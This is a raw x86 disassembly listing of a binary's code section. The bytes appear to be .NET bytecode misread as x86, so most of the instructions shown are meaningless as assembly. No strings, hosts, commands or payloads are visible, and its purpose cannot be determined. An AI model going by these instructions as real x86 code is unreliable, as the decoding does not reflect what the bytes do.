  404bff:	0a 00                	or     (%eax),%al
  404c01:	00 00                	add    %al,(%eax)
  404c03:	00 02                	add    %al,(%edx)
  404c05:	00 1f                	add    %bl,(%edi)
  404c07:	00 6a 89             	add    %ch,-0x77(%edx)
  404c0a:	00 0a                	add    %cl,(%edx)
	...
  404c14:	93                   	xchg   %eax,%ebx
  404c15:	93                   	xchg   %eax,%ebx
  404c16:	00 0a                	add    %cl,(%edx)
  404c18:	01 00                	add    %eax,(%eax)
  404c1a:	00 01                	add    %al,(%ecx)
  404c1c:	13 30                	adc    (%eax),%esi
  404c1e:	02 00                	add    (%eax),%al
  404c20:	2f                   	das
  404c21:	00 00                	add    %al,(%eax)
  404c23:	00 22                	add    %ah,(%edx)
  404c25:	00 00                	add    %al,(%eax)
  404c27:	11 28                	adc    %ebp,(%eax)
  404c29:	da 00                	fiaddl (%eax)
  404c2b:	00 0a                	add    %cl,(%edx)
  404c2d:	0a 16                	or     (%esi),%dl
  404c2f:	0b 2b                	or     (%ebx),%ebp
  404c31:	1d 06 07 9a 0c       	sbb    $0xc9a0706,%eax
  404c36:	08 6f db             	or     %ch,-0x25(%edi)
  404c39:	00 00                	add    %al,(%eax)
  404c3b:	0a 02                	or     (%edx),%al
  404c3d:	6f                   	outsl  %ds:(%esi),(%dx)
  404c3e:	dc 00                	faddl  (%eax)
  404c40:	00 0a                	add    %cl,(%edx)
  404c42:	28 dd                	sub    %bl,%ch
  404c44:	00 00                	add    %al,(%eax)
  404c46:	0a 2c 02             	or     (%edx,%eax,1),%ch
  404c49:	08 2a                	or     %ch,(%edx)
  404c4b:	07                   	pop    %es
  404c4c:	17                   	pop    %ss
  404c4d:	58                   	pop    %eax
  404c4e:	0b 07                	or     (%edi),%eax
  404c50:	06                   	push   %es
  404c51:	8e 69 32             	mov    0x32(%ecx),%gs
  404c54:	dd 14 2a             	fstl   (%edx,%ebp,1)
  404c57:	00 1b                	add    %bl,(%ebx)
  404c59:	30 01                	xor    %al,(%ecx)
  404c5b:	00 11                	add    %dl,(%ecx)
  404c5d:	00 00                	add    %al,(%eax)
  404c5f:	00 00                	add    %al,(%eax)
  404c61:	00 00                	add    %al,(%eax)
  404c63:	00 20                	add    %ah,(%eax)
  404c65:	03 00                	add    (%eax),%eax
  404c67:	00 80 28 85 00 00    	add    %al,0x8528(%eax)
  404c6d:	06                   	push   %es
  404c6e:	26 de 03             	fiadds %es:(%ebx)
  404c71:	26 de 00             	fiadds %es:(%eax)
  404c74:	2a 00                	sub    (%eax),%al
  404c76:	00 00                	add    %al,(%eax)
  404c78:	01 10                	add    %edx,(%eax)
  404c7a:	00 00                	add    %al,(%eax)
  404c7c:	00 00                	add    %al,(%eax)
  404c7e:	00 00                	add    %al,(%eax)
  404c80:	0d 0d 00 03 01       	or     $0x103000d,%eax
  404c85:	00 00                	add    %al,(%eax)
  404c87:	01 13                	add    %edx,(%ebx)
  404c89:	30 03                	xor    %al,(%ebx)
  404c8b:	00 14 00             	add    %dl,(%eax,%eax,1)
  404c8e:	00 00                	add    %al,(%eax)
  404c90:	02 00                	add    (%eax),%al
  404c92:	00 11                	add    %dl,(%ecx)
  404c94:	16                   	push   %ss
  404c95:	7e 08                	jle    0x404c9f
  404c97:	00 00                	add    %al,(%eax)
  404c99:	04 12                	add    $0x12,%al
  404c9b:	00 73 de             	add    %dh,-0x22(%ebx)
  404c9e:	00 00                	add    %al,(%eax)
  404ca0:	0a 80 39 00 00 04    	or     0x4000039(%eax),%al
  404ca6:	06                   	push   %es
  404ca7:	2a 1b                	sub    (%ebx),%bl
  404ca9:	30 03                	xor    %al,(%ebx)
  404cab:	00 24 00             	add    %ah,(%eax,%eax,1)
  404cae:	00 00                	add    %al,(%eax)
  404cb0:	00 00                	add    %al,(%eax)
  404cb2:	00 00                	add    %al,(%eax)
  404cb4:	14 fe                	adc    $0xfe,%al
  404cb6:	06                   	push   %es
  404cb7:	89 00                	mov    %eax,(%eax)
  404cb9:	00 06                	add    %al,(%esi)
  404cbb:	73 e0                	jae    0x404c9d
  404cbd:	00 00                	add    %al,(%eax)
  404cbf:	0a 28                	or     (%eax),%ch
  404cc1:	e1 00                	loope  0x404cc3
  404cc3:	00 0a                	add    %cl,(%edx)
  404cc5:	28 e2                	sub    %ah,%dl
  404cc7:	00 00                	add    %al,(%eax)
  404cc9:	0a 17                	or     (%edi),%dl
  404ccb:	16                   	push   %ss
  404ccc:	16                   	push   %ss
  404ccd:	28 8c 00 00 06 de 03 	sub    %cl,0x3de0600(%eax,%eax,1)
  404cd4:	26 de 00             	fiadds %es:(%eax)
  404cd7:	2a 01                	sub    (%ecx),%al
  404cd9:	10 00                	adc    %al,(%eax)
  404cdb:	00 00                	add    %al,(%eax)
  404cdd:	00 00                	add    %al,(%eax)
  404cdf:	00 20                	add    %ah,(%eax)
  404ce1:	20 00                	and    %al,(%eax)
  404ce3:	03 01                	add    (%ecx),%eax
  404ce5:	00 00                	add    %al,(%eax)
  404ce7:	01 1b                	add    %ebx,(%ebx)
  404ce9:	30 03                	xor    %al,(%ebx)
  404ceb:	00 18                	add    %bl,(%eax)
  404ced:	00 00                	add    %al,(%eax)
  404cef:	00 00                	add    %al,(%eax)
  404cf1:	00 00                	add    %al,(%eax)
  404cf3:	00 16                	add    %dl,(%esi)
  404cf5:	16                   	push   %ss
  404cf6:	16                   	push   %ss
  404cf7:	28 8c 00 00 06 de 0d 	sub    %cl,0xdde0600(%eax,%eax,1)
  404cfe:	26 20 a0 86 01 00 28 	and    %ah,%es:0x28000186(%eax)
  404d05:	14 00                	adc    $0x0,%al
  404d07:	00 0a                	add    %cl,(%edx)
  404d09:	2b f4                	sub    %esp,%esi
  404d0b:	2a 01                	sub    (%ecx),%al
  404d0d:	10 00                	adc    %al,(%eax)
  404d0f:	00 00                	add    %al,(%eax)
  404d11:	00 00                	add    %al,(%eax)
  404d13:	00 0a                	add    %cl,(%edx)
  404d15:	0a 00                	or     (%eax),%al
  404d17:	0d 01 00 00 01       	or     $0x1000001,%eax
  404d1c:	1b 30                	sbb    (%eax),%esi
  404d1e:	04 00                	add    $0x0,%al
  404d20:	38 00                	cmp    %al,(%eax)
  404d22:	00 00                	add    %al,(%eax)
  404d24:	23 00                	and    (%eax),%eax
  404d26:	00 11                	add    %dl,(%ecx)
  404d28:	7e 99                	jle    0x404cc3
  404d2a:	00 00                	add    %al,(%eax)
  404d2c:	0a 7e 3a             	or     0x3a(%esi),%bh
  404d2f:	00 00                	add    %al,(%eax)
  404d31:	04 18                	add    $0x18,%al
  404d33:	6f                   	outsl  %ds:(%esi),(%dx)
  404d34:	e3 00                	jecxz  0x404d36
  404d36:	00 0a                	add    %cl,(%edx)
  404d38:	0a 06                	or     (%esi),%al
  404d3a:	02 03                	add    (%ebx),%al
  404d3c:	18 6f e4             	sbb    %ch,-0x1c(%edi)
  404d3f:	00 00                	add    %al,(%eax)
  404d41:	0a 17                	or     (%edi),%dl
  404d43:	0b de                	or     %esi,%ebx
  404d45:	18 06                	sbb    %al,(%esi)
  404d47:	2c 06                	sub    $0x6,%al
  404d49:	06                   	push   %es
  404d4a:	6f                   	outsl  %ds:(%esi),(%dx)
  404d4b:	33 00                	xor    (%eax),%eax
  404d4d:	00 0a                	add    %cl,(%edx)
  404d4f:	dc 6f e5             	fsubrl -0x1b(%edi)
  404d52:	00 00                	add    %al,(%eax)
  404d54:	0a 28                	or     (%eax),%ch
  404d56:	95                   	xchg   %eax,%ebp
  404d57:	00 00                	add    %al,(%eax)
  404d59:	06                   	push   %es
  404d5a:	de 00                	fiadds (%eax)
  404d5c:	16                   	push   %ss
  404d5d:	2a 07                	sub    (%edi),%al
  404d5f:	2a 01                	sub    (%ecx),%al
  404d61:	1c 00                	sbb    $0x0,%al
  404d63:	00 02                	add    %al,(%edx)
  404d65:	00 11                	add    %dl,(%ecx)
  404d67:	00 0d 1e 00 0a 00    	add    %cl,0xa001e
  404d6d:	00 00                	add    %al,(%eax)
  404d6f:	00 00                	add    %al,(%eax)
  404d71:	00 00                	add    %al,(%eax)
  404d73:	00 28                	add    %ch,(%eax)
  404d75:	28 00                	sub    %al,(%eax)
  404d77:	0c 32                	or     $0x32,%al
  404d79:	00 00                	add    %al,(%eax)
  404d7b:	01 1b                	add    %ebx,(%ebx)
  404d7d:	30 02                	xor    %al,(%edx)
  404d7f:	00 39                	add    %bh,(%ecx)
  404d81:	00 00                	add    %al,(%eax)
  404d83:	00 24 00             	add    %ah,(%eax,%eax,1)
  404d86:	00 11                	add    %dl,(%ecx)
  404d88:	7e 99                	jle    0x404d23
  404d8a:	00 00                	add    %al,(%eax)
  404d8c:	0a 7e 3a             	or     0x3a(%esi),%bh
  404d8f:	00 00                	add    %al,(%eax)
  404d91:	04 6f                	add    $0x6f,%al
  404d93:	e6 00                	out    %al,$0x0
  404d95:	00 0a                	add    %cl,(%edx)
  404d97:	0a 06                	or     (%esi),%al
  404d99:	02 6f e7             	add    -0x19(%edi),%ch
  404d9c:	00 00                	add    %al,(%eax)
  404d9e:	0a 74 39 00          	or     0x0(%ecx,%edi,1),%dh
  404da2:	00 01                	add    %al,(%ecx)
  404da4:	0b de                	or     %esi,%ebx
  404da6:	18 06                	sbb    %al,(%esi)
  404da8:	2c 06                	sub    $0x6,%al
  404daa:	06                   	push   %es
  404dab:	6f                   	outsl  %ds:(%esi),(%dx)
  404dac:	33 00                	xor    (%eax),%eax
  404dae:	00 0a                	add    %cl,(%edx)
  404db0:	dc 6f e5             	fsubrl -0x1b(%edi)
  404db3:	00 00                	add    %al,(%eax)
  404db5:	0a 28                	or     (%eax),%ch
  404db7:	95                   	xchg   %eax,%ebp
  404db8:	00 00                	add    %al,(%eax)
  404dba:	06                   	push   %es
  404dbb:	de 00                	fiadds (%eax)
  404dbd:	14 2a                	adc    $0x2a,%al
  404dbf:	07                   	pop    %es
  404dc0:	2a 00                	sub    (%eax),%al
  404dc2:	00 00                	add    %al,(%eax)
  404dc4:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  404dc7:	00 02                	add    %al,(%edx)
  404dc9:	00 10                	add    %dl,(%eax)
  404dcb:	00 0f                	add    %cl,(%edi)
  404dcd:	1f                   	pop    %ds
  404dce:	00 0a                	add    %cl,(%edx)
	...
  404dd8:	29 29                	sub    %ebp,(%ecx)
  404dda:	00 0c 32             	add    %cl,(%edx,%esi,1)
  404ddd:	00 00                	add    %al,(%eax)
  404ddf:	01 1b                	add    %ebx,(%ebx)
  404de1:	30 02                	xor    %al,(%edx)
  404de3:	00 35 00 00 00 23    	add    %dh,0x23000000
  404de9:	00 00                	add    %al,(%eax)
  404deb:	11 7e 99             	adc    %edi,-0x67(%esi)
  404dee:	00 00                	add    %al,(%eax)
  404df0:	0a 7e 3a             	or     0x3a(%esi),%bh
  404df3:	00 00                	add    %al,(%eax)
  404df5:	04 6f                	add    $0x6f,%al
  404df7:	e6 00                	out    %al,$0x0
  404df9:	00 0a                	add    %cl,(%edx)
  404dfb:	0a 06                	or     (%esi),%al
  404dfd:	02 6f e8             	add    -0x18(%edi),%ch
  404e00:	00 00                	add    %al,(%eax)
  404e02:	0a 17                	or     (%edi),%dl
  404e04:	0b de                	or     %esi,%ebx
  404e06:	18 06                	sbb    %al,(%esi)
  404e08:	2c 06                	sub    $0x6,%al
  404e0a:	06                   	push   %es
  404e0b:	6f                   	outsl  %ds:(%esi),(%dx)
  404e0c:	33 00                	xor    (%eax),%eax
  404e0e:	00 0a                	add    %cl,(%edx)
  404e10:	dc 6f e5             	fsubrl -0x1b(%edi)
  404e13:	00 00                	add    %al,(%eax)
  404e15:	0a 28                	or     (%eax),%ch
  404e17:	95                   	xchg   %eax,%ebp
  404e18:	00 00                	add    %al,(%eax)
  404e1a:	06                   	push   %es
  404e1b:	de 00                	fiadds (%eax)
  404e1d:	16                   	push   %ss
  404e1e:	2a 07                	sub    (%edi),%al
  404e20:	2a 00                	sub    (%eax),%al
  404e22:	00 00                	add    %al,(%eax)
  404e24:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  404e27:	00 02                	add    %al,(%edx)
  404e29:	00 10                	add    %dl,(%eax)
  404e2b:	00 0b                	add    %cl,(%ebx)
  404e2d:	1b 00                	sbb    (%eax),%eax
  404e2f:	0a 00                	or     (%eax),%al
  404e31:	00 00                	add    %al,(%eax)
  404e33:	00 00                	add    %al,(%eax)
  404e35:	00 00                	add    %al,(%eax)
  404e37:	00 25 25 00 0c 32    	add    %ah,0x320c0025
  404e3d:	00 00                	add    %al,(%eax)
  404e3f:	01 1b                	add    %ebx,(%ebx)
  404e41:	30 03                	xor    %al,(%ebx)
  404e43:	00 3a                	add    %bh,(%edx)
  404e45:	00 00                	add    %al,(%eax)
  404e47:	00 23                	add    %ah,(%ebx)
  404e49:	00 00                	add    %al,(%eax)
  404e4b:	11 7e 99             	adc    %edi,-0x67(%esi)
  404e4e:	00 00                	add    %al,(%eax)
  404e50:	0a 72 6d             	or     0x6d(%edx),%dh
  404e53:	20 00                	and    %al,(%eax)
  404e55:	70 17                	jo     0x404e6e
  404e57:	6f                   	outsl  %ds:(%esi),(%dx)
  404e58:	e9 00 00 0a 0a       	jmp    0xa4a4e5d
  404e5d:	06                   	push   %es
  404e5e:	7e 3a                	jle    0x404e9a
  404e60:	00 00                	add    %al,(%eax)
  404e62:	04 6f                	add    $0x6f,%al
  404e64:	ea 00 00 0a 17 0b de 	ljmp   $0xde0b,$0x170a0000
  404e6b:	18 06                	sbb    %al,(%esi)
  404e6d:	2c 06                	sub    $0x6,%al
  404e6f:	06                   	push   %es
  404e70:	6f                   	outsl  %ds:(%esi),(%dx)
  404e71:	33 00                	xor    (%eax),%eax
  404e73:	00 0a                	add    %cl,(%edx)
  404e75:	dc 6f e5             	fsubrl -0x1b(%edi)
  404e78:	00 00                	add    %al,(%eax)
  404e7a:	0a 28                	or     (%eax),%ch
  404e7c:	95                   	xchg   %eax,%ebp
  404e7d:	00 00                	add    %al,(%eax)
  404e7f:	06                   	push   %es
  404e80:	de 00                	fiadds (%eax)
  404e82:	16                   	push   %ss
  404e83:	2a 07                	sub    (%edi),%al
  404e85:	2a 00                	sub    (%eax),%al
  404e87:	00 01                	add    %al,(%ecx)
  404e89:	1c 00                	sbb    $0x0,%al
  404e8b:	00 02                	add    %al,(%edx)
  404e8d:	00 11                	add    %dl,(%ecx)
  404e8f:	00 0f                	add    %cl,(%edi)
  404e91:	20 00                	and    %al,(%eax)
  404e93:	0a 00                	or     (%eax),%al
  404e95:	00 00                	add    %al,(%eax)
  404e97:	00 00                	add    %al,(%eax)
  404e99:	00 00                	add    %al,(%eax)
  404e9b:	00 2a                	add    %ch,(%edx)
  404e9d:	2a 00                	sub    (%eax),%al
  404e9f:	0c 32                	or     $0x32,%al
  404ea1:	00 00                	add    %al,(%eax)
  404ea3:	01 1b                	add    %ebx,(%ebx)
  404ea5:	30 04 00             	xor    %al,(%eax,%eax,1)
  404ea8:	c4 01                	les    (%ecx),%eax
  404eaa:	00 00                	add    %al,(%eax)
  404eac:	25 00 00 11 73       	and    $0x73110000,%eax
  404eb1:	62 00                	bound  %eax,(%eax)
  404eb3:	00 06                	add    %al,(%esi)
  404eb5:	0a 06                	or     (%esi),%al
  404eb7:	02 74 03 00          	add    0x0(%ebx,%eax,1),%dh
  404ebb:	00 1b                	add    %bl,(%ebx)
  404ebd:	6f                   	outsl  %ds:(%esi),(%dx)
  404ebe:	54                   	push   %esp
  404ebf:	00 00                	add    %al,(%eax)
  404ec1:	06                   	push   %es
  404ec2:	06                   	push   %es
  404ec3:	72 81                	jb     0x404e46
  404ec5:	20 00                	and    %al,(%eax)
  404ec7:	70 6f                	jo     0x404f38
  404ec9:	4d                   	dec    %ebp
  404eca:	00 00                	add    %al,(%eax)
  404ecc:	06                   	push   %es
  404ecd:	6f                   	outsl  %ds:(%esi),(%dx)
  404ece:	59                   	pop    %ecx
  404ecf:	00 00                	add    %al,(%eax)
  404ed1:	06                   	push   %es
  404ed2:	0b 07                	or     (%edi),%eax
  404ed4:	39 8c 01 00 00 07 72 	cmp    %ecx,0x72070000(%ecx,%eax,1)
  404edb:	17                   	pop    %ss
  404edc:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  404ee0:	27                   	daa
  404ee1:	00 00                	add    %al,(%eax)
  404ee3:	0a 2d 22 07 72 21    	or     0x21720722,%ch
  404ee9:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  404eed:	27                   	daa
  404eee:	00 00                	add    %al,(%eax)
  404ef0:	0a 2d 56 07 72 2f    	or     0x2f720756,%ch
  404ef6:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  404efa:	27                   	daa
  404efb:	00 00                	add    %al,(%eax)
  404efd:	0a 3a                	or     (%edx),%bh
  404eff:	cb                   	lret
  404f00:	00 00                	add    %al,(%eax)
  404f02:	00 38                	add    %bh,(%eax)
  404f04:	5d                   	pop    %ebp
  404f05:	01 00                	add    %eax,(%eax)
  404f07:	00 28                	add    %ch,(%eax)
  404f09:	17                   	pop    %ss
  404f0a:	00 00                	add    %al,(%eax)
  404f0c:	06                   	push   %es
  404f0d:	0c 73                	or     $0x73,%al
  404f0f:	62 00                	bound  %eax,(%eax)
  404f11:	00 06                	add    %al,(%esi)
  404f13:	25 72 81 20 00       	and    $0x208172,%eax
  404f18:	70 6f                	jo     0x404f89
  404f1a:	4d                   	dec    %ebp
  404f1b:	00 00                	add    %al,(%eax)
  404f1d:	06                   	push   %es
  404f1e:	72 17                	jb     0x404f37
  404f20:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404f24:	4f                   	dec    %edi
  404f25:	00 00                	add    %al,(%eax)
  404f27:	06                   	push   %es
  404f28:	25 72 99 20 00       	and    $0x209972,%eax
  404f2d:	70 6f                	jo     0x404f9e
  404f2f:	4d                   	dec    %ebp
  404f30:	00 00                	add    %al,(%eax)
  404f32:	06                   	push   %es
  404f33:	08 6a 6f             	or     %ch,0x6f(%edx)
  404f36:	42                   	inc    %edx
  404f37:	00 00                	add    %al,(%eax)
  404f39:	06                   	push   %es
  404f3a:	6f                   	outsl  %ds:(%esi),(%dx)
  404f3b:	57                   	push   %edi
  404f3c:	00 00                	add    %al,(%eax)
  404f3e:	06                   	push   %es
  404f3f:	28 1e                	sub    %bl,(%esi)
  404f41:	00 00                	add    %al,(%eax)
  404f43:	06                   	push   %es
  404f44:	38 1c 01             	cmp    %bl,(%ecx,%eax,1)
  404f47:	00 00                	add    %al,(%eax)
  404f49:	00 06                	add    %al,(%esi)
  404f4b:	28 93 00 00 06 dd    	sub    %dl,-0x22fa0000(%ebx)
  404f51:	10 01                	adc    %al,(%ecx)
  404f53:	00 00                	add    %al,(%eax)
  404f55:	0d 06 72 45 26       	or     $0x26457206,%eax
  404f5a:	00 70 6f             	add    %dh,0x6f(%eax)
  404f5d:	4d                   	dec    %ebp
  404f5e:	00 00                	add    %al,(%eax)
  404f60:	06                   	push   %es
  404f61:	6f                   	outsl  %ds:(%esi),(%dx)
  404f62:	59                   	pop    %ecx
  404f63:	00 00                	add    %al,(%eax)
  404f65:	06                   	push   %es
  404f66:	28 8e 00 00 06 2d    	sub    %cl,0x2d060000(%esi)
  404f6c:	51                   	push   %ecx
  404f6d:	7e 3b                	jle    0x404faa
  404f6f:	00 00                	add    %al,(%eax)
  404f71:	04 06                	add    $0x6,%al
  404f73:	6f                   	outsl  %ds:(%esi),(%dx)
  404f74:	5d                   	pop    %ebp
  404f75:	00 00                	add    %al,(%eax)
  404f77:	0a 73 62             	or     0x62(%ebx),%dh
  404f7a:	00 00                	add    %al,(%eax)
  404f7c:	06                   	push   %es
  404f7d:	25 72 81 20 00       	and    $0x208172,%eax
  404f82:	70 6f                	jo     0x404ff3
  404f84:	4d                   	dec    %ebp
  404f85:	00 00                	add    %al,(%eax)
  404f87:	06                   	push   %es
  404f88:	72 4d                	jb     0x404fd7
  404f8a:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404f8e:	4f                   	dec    %edi
  404f8f:	00 00                	add    %al,(%eax)
  404f91:	06                   	push   %es
  404f92:	25 72 63 26 00       	and    $0x266372,%eax
  404f97:	70 6f                	jo     0x405008
  404f99:	4d                   	dec    %ebp
  404f9a:	00 00                	add    %al,(%eax)
  404f9c:	06                   	push   %es
  404f9d:	06                   	push   %es
  404f9e:	72 45                	jb     0x404fe5
  404fa0:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404fa4:	4d                   	dec    %ebp
  404fa5:	00 00                	add    %al,(%eax)
  404fa7:	06                   	push   %es
  404fa8:	6f                   	outsl  %ds:(%esi),(%dx)
  404fa9:	59                   	pop    %ecx
  404faa:	00 00                	add    %al,(%eax)
  404fac:	06                   	push   %es
  404fad:	6f                   	outsl  %ds:(%esi),(%dx)
  404fae:	4f                   	dec    %edi
  404faf:	00 00                	add    %al,(%eax)
  404fb1:	06                   	push   %es
  404fb2:	6f                   	outsl  %ds:(%esi),(%dx)
  404fb3:	57                   	push   %edi
  404fb4:	00 00                	add    %al,(%eax)
  404fb6:	06                   	push   %es
  404fb7:	28 1e                	sub    %bl,(%esi)
  404fb9:	00 00                	add    %al,(%eax)
  404fbb:	06                   	push   %es
  404fbc:	2b 0b                	sub    (%ebx),%ecx
  404fbe:	09 6f e5             	or     %ebp,-0x1b(%edi)
  404fc1:	00 00                	add    %al,(%eax)
  404fc3:	0a 28                	or     (%eax),%ch
  404fc5:	95                   	xchg   %eax,%ebp
  404fc6:	00 00                	add    %al,(%eax)
  404fc8:	06                   	push   %es
  404fc9:	dd 97 00 00 00 06    	fstl   0x6000000(%edi)
  404fcf:	72 71                	jb     0x405042
  404fd1:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404fd5:	4d                   	dec    %ebp
  404fd6:	00 00                	add    %al,(%eax)
  404fd8:	06                   	push   %es
  404fd9:	6f                   	outsl  %ds:(%esi),(%dx)
  404fda:	59                   	pop    %ecx
  404fdb:	00 00                	add    %al,(%eax)
  404fdd:	06                   	push   %es
  404fde:	06                   	push   %es
  404fdf:	72 45                	jb     0x405026
  404fe1:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404fe5:	4d                   	dec    %ebp
  404fe6:	00 00                	add    %al,(%eax)
  404fe8:	06                   	push   %es
  404fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  404fea:	59                   	pop    %ecx
  404feb:	00 00                	add    %al,(%eax)
  404fed:	06                   	push   %es
  404fee:	28 8d 00 00 06 26    	sub    %cl,0x26060000(%ebp)
  404ff4:	7e 3b                	jle    0x405031
  404ff6:	00 00                	add    %al,(%eax)
  404ff8:	04 28                	add    $0x28,%al
  404ffa:	03 00                	add    (%eax),%eax
  404ffc:	00 2b                	add    %ch,(%ebx)
  404ffe:	6f                   	outsl  %ds:(%esi),(%dx)
  404fff:	5e                   	pop    %esi
  405000:	00 00                	add    %al,(%eax)
  405002:	0a 13                	or     (%ebx),%dl
  405004:	04 2b                	add    $0x2b,%al
  405006:	45                   	inc    %ebp
  405007:	12 04 28             	adc    (%eax,%ebp,1),%al
  40500a:	5f                   	pop    %edi
  40500b:	00 00                	add    %al,(%eax)
  40500d:	0a 13                	or     (%ebx),%dl
  40500f:	05 11 05 72 45       	add    $0x45720511,%eax
  405014:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  405018:	4d                   	dec    %ebp
  405019:	00 00                	add    %al,(%eax)
  40501b:	06                   	push   %es
  40501c:	6f                   	outsl  %ds:(%esi),(%dx)
  40501d:	59                   	pop    %ecx
  40501e:	00 00                	add    %al,(%eax)
  405020:	06                   	push   %es
  405021:	06                   	push   %es
  405022:	72 71                	jb     0x405095
  405024:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  405028:	4d                   	dec    %ebp
  405029:	00 00                	add    %al,(%eax)
  40502b:	06                   	push   %es
  40502c:	6f                   	outsl  %ds:(%esi),(%dx)
  40502d:	59                   	pop    %ecx
  40502e:	00 00                	add    %al,(%eax)
  405030:	06                   	push   %es
  405031:	28 27                	sub    %ah,(%edi)
  405033:	00 00                	add    %al,(%eax)
  405035:	0a 2c 14             	or     (%esp,%edx,1),%ch
  405038:	11 05 28 93 00 00    	adc    %eax,0x9328
  40503e:	06                   	push   %es
  40503f:	7e 3b                	jle    0x40507c
  405041:	00 00                	add    %al,(%eax)
  405043:	04 11                	add    $0x11,%al
  405045:	05 6f ec 00 00       	add    $0xec6f,%eax
  40504a:	0a 26                	or     (%esi),%ah
  40504c:	12 04 28             	adc    (%eax,%ebp,1),%al
  40504f:	61                   	popa
  405050:	00 00                	add    %al,(%eax)
  405052:	0a 2d b2 de 0e 12    	or     0x120edeb2,%ch
  405058:	04 fe                	add    $0xfe,%al
  40505a:	16                   	push   %ss
  40505b:	02 00                	add    (%eax),%al
  40505d:	00 1b                	add    %bl,(%ebx)
  40505f:	6f                   	outsl  %ds:(%esi),(%dx)
  405060:	33 00                	xor    (%eax),%eax
  405062:	00 0a                	add    %cl,(%edx)
  405064:	dc de                	(bad)
  405066:	0c 6f                	or     $0x6f,%al
  405068:	e5 00                	in     $0x0,%eax
  40506a:	00 0a                	add    %cl,(%edx)
  40506c:	28 95 00 00 06 de    	sub    %dl,-0x21fa0000(%ebp)
  405072:	00 2a                	add    %ch,(%edx)
  405074:	41                   	inc    %ecx
  405075:	4c                   	dec    %esp
  405076:	00 00                	add    %al,(%eax)
  405078:	00 00                	add    %al,(%eax)
  40507a:	00 00                	add    %al,(%eax)
  40507c:	9a 00 00 00 0b 00 00 	lcall  $0x0,$0xb000000
  405083:	00 a5 00 00 00 79    	add    %ah,0x79000000(%ebp)
  405089:	00 00                	add    %al,(%eax)
  40508b:	00 32                	add    %dh,(%edx)
  40508d:	00 00                	add    %al,(%eax)
  40508f:	01 02                	add    %eax,(%edx)
  405091:	00 00                	add    %al,(%eax)
  405093:	00 55 01             	add    %dl,0x1(%ebp)
  405096:	00 00                	add    %al,(%eax)
  405098:	52                   	push   %edx
  405099:	00 00                	add    %al,(%eax)
  40509b:	00 a7 01 00 00 0e    	add    %ah,0xe000001(%edi)
	...
  4050ad:	00 00                	add    %al,(%eax)
  4050af:	00 b7 01 00 00 b7    	add    %dh,-0x48ffffff(%edi)
  4050b5:	01 00                	add    %eax,(%eax)
  4050b7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4050ba:	00 00                	add    %al,(%eax)
  4050bc:	32 00                	xor    (%eax),%al
  4050be:	00 01                	add    %al,(%ecx)
  4050c0:	13 30                	adc    (%eax),%esi
  4050c2:	0b 00                	or     (%eax),%eax
  4050c4:	1b 01                	sbb    (%ecx),%eax
  4050c6:	00 00                	add    %al,(%eax)
  4050c8:	26 00 00             	add    %al,%es:(%eax)
  4050cb:	11 28                	adc    %ebp,(%eax)
  4050cd:	ed                   	in     (%dx),%eax
  4050ce:	00 00                	add    %al,(%eax)
  4050d0:	0a 02                	or     (%edx),%al
  4050d2:	72 45                	jb     0x405119
  4050d4:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4050d8:	4d                   	dec    %ebp
  4050d9:	00 00                	add    %al,(%eax)
  4050db:	06                   	push   %es
  4050dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4050dd:	59                   	pop    %ecx
  4050de:	00 00                	add    %al,(%eax)
  4050e0:	06                   	push   %es
  4050e1:	28 8e 00 00 06 28    	sub    %cl,0x28060000(%esi)
  4050e7:	9a 00 00 0a 28 1c 00 	lcall  $0x1c,$0x280a0000
  4050ee:	00 0a                	add    %cl,(%edx)
  4050f0:	28 a0 00 00 06 6f    	sub    %ah,0x6f060000(%eax)
  4050f6:	ee                   	out    %al,(%dx)
  4050f7:	00 00                	add    %al,(%eax)
  4050f9:	0a 72 7b             	or     0x7b(%edx),%dh
  4050fc:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  405100:	ef                   	out    %eax,(%dx)
  405101:	00 00                	add    %al,(%eax)
  405103:	0a 28                	or     (%eax),%ch
  405105:	f0 00 00             	lock add %al,(%eax)
  405108:	0a 0a                	or     (%edx),%cl
  40510a:	7e 3c                	jle    0x405148
  40510c:	00 00                	add    %al,(%eax)
  40510e:	04 3a                	add    $0x3a,%al
  405110:	85 00                	test   %eax,(%eax)
  405112:	00 00                	add    %al,(%eax)
  405114:	20 00                	and    %al,(%eax)
  405116:	01 00                	add    %eax,(%eax)
  405118:	00 72 97             	add    %dh,-0x69(%edx)
  40511b:	26 00 70 14          	add    %dh,%es:0x14(%eax)
  40511f:	d0 16                	rclb   $1,(%esi)
  405121:	00 00                	add    %al,(%eax)
  405123:	02 28                	add    (%eax),%ch
  405125:	f1                   	int1
  405126:	00 00                	add    %al,(%eax)
  405128:	0a 1f                	or     (%edi),%bl
  40512a:	09 8d 86 00 00 01    	or     %ecx,0x1000086(%ebp)
  405130:	25 16 16 14 28       	and    $0x28141616,%eax
  405135:	f2 00 00             	repnz add %al,(%eax)
  405138:	0a a2 25 17 17 14    	or     0x14171725(%edx),%ah
  40513e:	28 f2                	sub    %dh,%dl
  405140:	00 00                	add    %al,(%eax)
  405142:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  405148:	28 f2                	sub    %dh,%dl
  40514a:	00 00                	add    %al,(%eax)
  40514c:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  405152:	28 f2                	sub    %dh,%dl
  405154:	00 00                	add    %al,(%eax)
  405156:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  40515c:	28 f2                	sub    %dh,%dl
  40515e:	00 00                	add    %al,(%eax)
  405160:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  405166:	28 f2                	sub    %dh,%dl
  405168:	00 00                	add    %al,(%eax)
  40516a:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
